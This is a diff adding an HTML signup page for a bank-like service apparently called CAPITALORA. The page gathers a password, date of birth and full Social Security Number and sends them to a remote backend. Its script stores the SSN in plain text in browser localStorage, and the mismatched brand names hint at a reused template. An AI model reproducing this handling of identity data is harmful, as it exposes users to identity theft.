@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>CAPITALORA | Create Account</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --gradient-premium: linear-gradient(135deg, #8b5cf6 0%, #6366f1 25%, #3b82f6 50%, #06b6d4 100%);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { height: 100%; overflow: hidden; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #030308;
+      color: #f0f0f5;
+      -webkit-font-smoothing: antialiased;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      background-image: 
+        radial-gradient(ellipse at 20% 20%, rgba(139, 92, 246, 0.08) 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 80%, rgba(59, 130, 246, 0.06) 0%, transparent 50%),
+        radial-gradient(ellipse at 50% 50%, rgba(6, 182, 212, 0.04) 0%, transparent 50%);
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: flex;
+      justify-content: center;
+      padding: 0 24px;
+      padding-top: 4vh;
+      overflow-y: auto;
+    }
+
+    input, select, textarea {
+      -webkit-user-select: text;
+      user-select: text;
+    }
+
+    .signup-wrapper {
+      width: 100%;
+      max-width: 440px;
+      padding-bottom: 20px;
+    }
+
+    .signup-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 32px;
+      font-weight: 700;
+      letter-spacing: -0.03em;
+      background: var(--gradient-premium);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .signup-header h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #e8e8f5;
+      margin-top: 6px;
+    }
+
+    .signup-header p {
+      font-size: 12px;
+      color: #8080a8;
+      margin-top: 2px;
+    }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .step-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+    }
+    .step-dot.active {
+      background: var(--gradient-premium);
+    }
+
+    .form-step {
+      display: none;
+    }
+    .form-step.active {
+      display: block;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Top back navigation (icon only, clean) */
+    .back-nav {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 20px;
+      cursor: pointer;
+      width: fit-content;
+      padding: 6px 12px 6px 6px;
+      border-radius: 40px;
+      background: rgba(139, 92, 246, 0.08);
+      transition: all 0.2s ease;
+      color: #c4b5fd;
+      font-size: 13px;
+      font-weight: 500;
+    }
+    .back-nav i {
+      font-size: 16px;
+      transition: transform 0.2s;
+    }
+    .back-nav:active {
+      transform: scale(0.96);
+      background: rgba(139, 92, 246, 0.15);
+    }
+    .back-nav:hover {
+      background: rgba(139, 92, 246, 0.12);
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 11px;
+      font-weight: 600;
+      color: #b0b0d0;
+      margin-bottom: 5px;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-wrapper i {
+      position: absolute;
+      left: 13px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #6b6b8a;
+      font-size: 13px;
+      pointer-events: none;
+    }
+
+    .input-wrapper .toggle-password {
+      left: auto;
+      right: 12px;
+      pointer-events: auto;
+      cursor: pointer;
+      color: #6b6b8a;
+    }
+
+    .input-wrapper input,
+    .input-wrapper select {
+      width: 100%;
+      padding: 13px 40px 13px 40px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      outline: none;
+      transition: border-color 0.2s, background 0.2s;
+      appearance: none;
+    }
+
+    .input-wrapper input:focus,
+    .input-wrapper select:focus {
+      border-color: rgba(139, 92, 246, 0.5);
+      background: rgba(255, 255, 255, 0.06);
+    }
+
+    select option {
+      background: #1a1a2e;
+      color: #fff;
+    }
+
+    .strength-bars {
+      display: flex;
+      gap: 3px;
+      margin-top: 6px;
+    }
+    .strength-bar {
+      flex: 1;
+      height: 3px;
+      border-radius: 2px;
+      background: rgba(255,255,255,0.06);
+      transition: background 0.3s;
+    }
+    .strength-bar.weak { background: #f87171; }
+    .strength-bar.medium { background: #f59e0b; }
+    .strength-bar.strong { background: #10b981; }
+
+    .strength-text {
+      font-size: 10px;
+      color: #7878a0;
+      margin-top: 3px;
+    }
+
+    .terms-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 6px;
+      margin: 16px 0;
+      font-size: 11px;
+      color: #a0a0c0;
+    }
+    .terms-row input {
+      accent-color: #8b5cf6;
+      width: 14px;
+      height: 14px;
+      margin-top: 1px;
+      cursor: pointer;
+    }
+    .terms-row a {
+      color: #a78bfa;
+      text-decoration: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border-radius: 50px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+      font-family: 'Inter', sans-serif;
+      background: var(--gradient-premium);
+      color: #fff;
+      box-shadow: 0 8px 25px rgba(139, 92, 246, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform 0.2s;
+    }
+    .btn:active {
+      transform: scale(0.97);
+    }
+    .btn:disabled {
+      opacity: 0.7;
+    }
+    .btn-outline {
+      background: transparent;
+      color: #a78bfa;
+      border: 1px solid rgba(139, 92, 246, 0.3);
+      margin-top: 8px;
+    }
+
+    .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .error-msg {
+      color: #f87171;
+      font-size: 10px;
+      margin-top: 3px;
+      display: none;
+    }
+
+    .login-text {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 12px;
+      color: #8080a8;
+    }
+    .login-text a {
+      color: #a78bfa;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .toast {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #8b5cf6, #3b82f6);
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 600;
+      box-shadow: 0 10px 30px rgba(139, 92, 246, 0.4);
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    /* Full-width submit button container (no split) */
+    .submit-container {
+      margin-top: 12px;
+      margin-bottom: 8px;
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 0 16px; padding-top: 2vh; }
+      .logo { font-size: 26px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="toast" id="toast"></div>
+
+  <div class="signup-wrapper">
+    <div id="formContainer">
+      <div class="signup-header">
+        <div class="logo">CAPITALORA</div>
+        <h2>Create your account</h2>
+        <p>Fill in your details to get started</p>
+        <div class="step-indicator">
+          <span class="step-dot active" id="stepDot1"></span>
+          <span class="step-dot" id="stepDot2"></span>
+        </div>
+      </div>
+
+      <!-- Step 1: Basic Info -->
+      <form id="step1Form" class="form-step active" onsubmit="goToStep2(event)">
+        <div class="form-group">
+          <label>Full legal name</label>
+          <div class="input-wrapper">
+            <i class="fas fa-user"></i>
+            <input type="text" id="nameInput" placeholder="John Doe" required>
+          </div>
+          <div class="error-msg" id="nameError">Please enter your full name.</div>
+        </div>
+
+        <div class="form-group">
+          <label>Email address</label>
+          <div class="input-wrapper">
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="emailInput" placeholder="you@example.com" required>
+          </div>
+          <div class="error-msg" id="emailError">Please enter a valid email.</div>
+        </div>
+
+        <div class="form-group">
+          <label>Password</label>
+          <div class="input-wrapper">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="signupPassword" placeholder="Min. 8 characters" required oninput="checkStrength()">
+            <i class="fas fa-eye toggle-password" onclick="togglePassword('signupPassword', this)"></i>
+          </div>
+          <div class="strength-bars">
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+          </div>
+          <div class="strength-text" id="strengthText"></div>
+          <div class="error-msg" id="passwordError">Password must be at least 8 characters.</div>
+        </div>
+
+        <div class="terms-row">
+          <input type="checkbox" id="termsCheck" required>
+          <span>I agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></span>
+        </div>
+
+        <button type="submit" class="btn">
+          <span>Next: Personal Details</span>
+          <i class="fas fa-arrow-right"></i>
+        </button>
+      </form>
+
+      <!-- Step 2: Personal Details with TOP BACK ICON (removed bottom back button) -->
+      <form id="step2Form" class="form-step" onsubmit="handleSignup(event)">
+        <!-- Back navigation as top icon (clean, replaces old back button) -->
+        <div class="back-nav" onclick="goToStep1()">
+          <i class="fas fa-arrow-left"></i> 
+          <span>Back</span>
+        </div>
+
+        <div class="form-group">
+          <label>Date of Birth</label>
+          <div class="input-wrapper">
+            <i class="fas fa-calendar"></i>
+            <input type="date" id="dobInput" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Gender</label>
+          <div class="input-wrapper">
+            <i class="fas fa-venus-mars"></i>
+            <select id="genderInput" required>
+              <option value="">Select gender</option>
+              <option value="Male">Male</option>
+              <option value="Female">Female</option>
+              <option value="Other">Other</option>
+              <option value="Prefer not to say">Prefer not to say</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>City</label>
+          <div class="input-wrapper">
+            <i class="fas fa-city"></i>
+            <input type="text" id="cityInput" placeholder="City" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>State/Province</label>
+          <div class="input-wrapper">
+            <i class="fas fa-map-pin"></i>
+            <input type="text" id="stateInput" placeholder="State" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>SSN (Full Social Security Number)</label>
+          <div class="input-wrapper">
+            <i class="fas fa-id-card"></i>
+            <input type="text" id="ssnInput" placeholder="123-45-6789" maxlength="11" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Account Type</label>
+          <div class="input-wrapper">
+            <i class="fas fa-university"></i>
+            <select id="accountTypeInput" required>
+              <option value="">Select account type</option>
+              <option value="Checking">Checking</option>
+              <option value="Savings">Savings</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Employment Status</label>
+          <div class="input-wrapper">
+            <i class="fas fa-briefcase"></i>
+            <select id="employmentInput" required>
+              <option value="">Select status</option>
+              <option value="Employed">Employed</option>
+              <option value="Self-employed">Self-employed</option>
+              <option value="Unemployed">Unemployed</option>
+              <option value="Student">Student</option>
+              <option value="Retired">Retired</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Annual Income (optional)</label>
+          <div class="input-wrapper">
+            <i class="fas fa-dollar-sign"></i>
+            <select id="incomeInput">
+              <option value="">Prefer not to say</option>
+              <option value="0-25k">$0 - $25,000</option>
+              <option value="25k-50k">$25,000 - $50,000</option>
+              <option value="50k-100k">$50,000 - $100,000</option>
+              <option value="100k+">$100,000+</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Full-width Create Account button (no secondary back button anymore) -->
+        <div class="submit-container">
+          <button type="submit" class="btn" id="submitBtn">
+            <span id="btnText">Create Account</span>
+            <span class="spinner" id="spinner"></span>
+          </button>
+        </div>
+      </form>
+
+      <div class="login-text">Already have an account? <a href="login.html">Log in</a></div>
+    </div>
+
+    <!-- Success state -->
+    <div id="successState" style="display:none; text-align:center; padding-top:4vh;">
+      <div style="width:64px;height:64px;border-radius:50%;background:rgba(16,185,129,0.12);border:2px solid rgba(16,185,129,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:30px;color:#10b981;">
+        <i class="fas fa-check"></i>
+      </div>
+      <h3>Account created!</h3>
+      <p style="color:#9090b0;font-size:13px;">You'll now set up your transaction PIN.</p>
+      <button class="btn" onclick="redirectToPin()">Set PIN</button>
+      <button class="btn btn-outline" onclick="createAnother()">Create another account</button>
+    </div>
+  </div>
+
+  <script>
+    let currentUserId = null;
+    let step = 1;
+
+    function showToast(message, duration = 3000) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.classList.add('show');
+      clearTimeout(toast._timeout);
+      toast._timeout = setTimeout(() => toast.classList.remove('show'), duration);
+    }
+
+    function togglePassword(inputId, icon) {
+      const input = document.getElementById(inputId);
+      if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.replace('fa-eye', 'fa-eye-slash');
+      } else {
+        input.type = 'password';
+        icon.classList.replace('fa-eye-slash', 'fa-eye');
+      }
+    }
+
+    function checkStrength() {
+      const pwd = document.getElementById('signupPassword').value;
+      const bars = document.querySelectorAll('.strength-bar');
+      const text = document.getElementById('strengthText');
+      bars.forEach(b => b.className = 'strength-bar');
+      if (!pwd) { text.textContent = ''; return; }
+      let score = 0;
+      if (pwd.length >= 8) score++;
+      if (pwd.length >= 12) score++;
+      if (/[A-Z]/.test(pwd)) score++;
+      if (/[0-9]/.test(pwd)) score++;
+      if (/[^A-Za-z0-9]/.test(pwd)) score++;
+      let level = 'weak';
+      if (score >= 4) level = 'strong';
+      else if (score >= 2) level = 'medium';
+      const count = level === 'weak' ? 1 : level === 'medium' ? 2 : 4;
+      for (let i = 0; i < count; i++) bars[i].classList.add(level);
+      text.textContent = level === 'weak' ? 'Weak password' : level === 'medium' ? 'Medium password' : 'Strong password';
+      text.style.color = level === 'weak' ? '#f87171' : level === 'medium' ? '#f59e0b' : '#10b981';
+    }
+
+    function goToStep2(e) {
+      e.preventDefault();
+      const name = document.getElementById('nameInput').value.trim();
+      const email = document.getElementById('emailInput').value.trim();
+      const password = document.getElementById('signupPassword').value;
+      const terms = document.getElementById('termsCheck');
+      
+      document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
+      let valid = true;
+      if (name.length < 2) { document.getElementById('nameError').style.display = 'block'; valid = false; }
+      if (!email.includes('@') || !email.includes('.')) { document.getElementById('emailError').style.display = 'block'; valid = false; }
+      if (password.length < 8) { document.getElementById('passwordError').style.display = 'block'; valid = false; }
+      if (!terms.checked) { showToast('Please agree to the terms'); valid = false; }
+      if (!valid) return;
+
+      document.getElementById('step1Form').classList.remove('active');
+      document.getElementById('step2Form').classList.add('active');
+      document.getElementById('stepDot1').classList.remove('active');
+      document.getElementById('stepDot2').classList.add('active');
+      step = 2;
+    }
+
+    function goToStep1() {
+      document.getElementById('step2Form').classList.remove('active');
+      document.getElementById('step1Form').classList.add('active');
+      document.getElementById('stepDot2').classList.remove('active');
+      document.getElementById('stepDot1').classList.add('active');
+      step = 1;
+    }
+
+    async function handleSignup(e) {
+      e.preventDefault();
+      const name = document.getElementById('nameInput').value.trim();
+      const email = document.getElementById('emailInput').value.trim();
+      const password = document.getElementById('signupPassword').value;
+      const dob = document.getElementById('dobInput').value;
+      const gender = document.getElementById('genderInput').value;
+      const city = document.getElementById('cityInput').value.trim();
+      const state = document.getElementById('stateInput').value.trim();
+      const ssn = document.getElementById('ssnInput').value.trim();
+      const accountType = document.getElementById('accountTypeInput').value;
+      const employment = document.getElementById('employmentInput').value;
+      const income = document.getElementById('incomeInput').value;
+
+      if (!dob || !gender || !city || !state || !ssn || !accountType || !employment) {
+        showToast('Please fill all required fields');
+        return;
+      }
+
+      const btn = document.getElementById('submitBtn');
+      const btnText = document.getElementById('btnText');
+      const spinner = document.getElementById('spinner');
+      btn.disabled = true;
+      btnText.style.display = 'none';
+      spinner.style.display = 'inline-block';
+
+      try {
+        const API_BASE ="https://aurex-b-production-376a.up.railway.app";
+        const response = await fetch(`${API_BASE}/api/register`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name, email, password,
+            dob, gender, city, state, ssn, accountType, employment, income
+          })
+        });
+        
+        const data = await response.json();
+        btn.disabled = false;
+        btnText.style.display = 'inline';
+        spinner.style.display = 'none';
+
+        if (data.success) {
+          currentUserId = data.userId;
+          const profile = { dob, gender, city, state, ssn, accountType, employment, income };
+          localStorage.setItem('finova_user_profile', JSON.stringify(profile));
+          localStorage.setItem('finova_temp_user_id', data.userId);
+          document.getElementById('formContainer').style.display = 'none';
+          document.getElementById('successState').style.display = 'block';
+        } else {
+          showToast(data.message || 'Registration failed');
+        }
+      } catch (error) {
+        btn.disabled = false;
+        btnText.style.display = 'inline';
+        spinner.style.display = 'none';
+        showToast('Connection error. Please try again.');
+      }
+    }
+
+    function redirectToPin() {
+      window.location.href = `pin.html?userId=${currentUserId}`;
+    }
+
+    function createAnother() {
+      document.getElementById('formContainer').style.display = 'block';
+      document.getElementById('successState').style.display = 'none';
+      document.querySelectorAll('input:not([type=checkbox])').forEach(i => i.value = '');
+      document.querySelectorAll('select').forEach(sel => sel.selectedIndex = 0);
+      document.querySelectorAll('.strength-bar').forEach(b => b.className = 'strength-bar');
+      document.getElementById('strengthText').textContent = '';
+      document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
+      const termsCheck = document.getElementById('termsCheck');
+      if (termsCheck) termsCheck.checked = false;
+      goToStep1();
+      currentUserId = null;
+    }
+
+    // Disable context menu, but allow scrolling (removed touchmove block for full scrollability)
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    
+    // Ensuring form can scroll naturally (removed earlier touchmove.preventDefault that breaks UX)
+    // Also restore any potential scroll issues: body already has overflow-y auto, so touch/mouse scroll works.
+    window.scrollTo(0, 0);
+  </script>
+</body>
+</html>
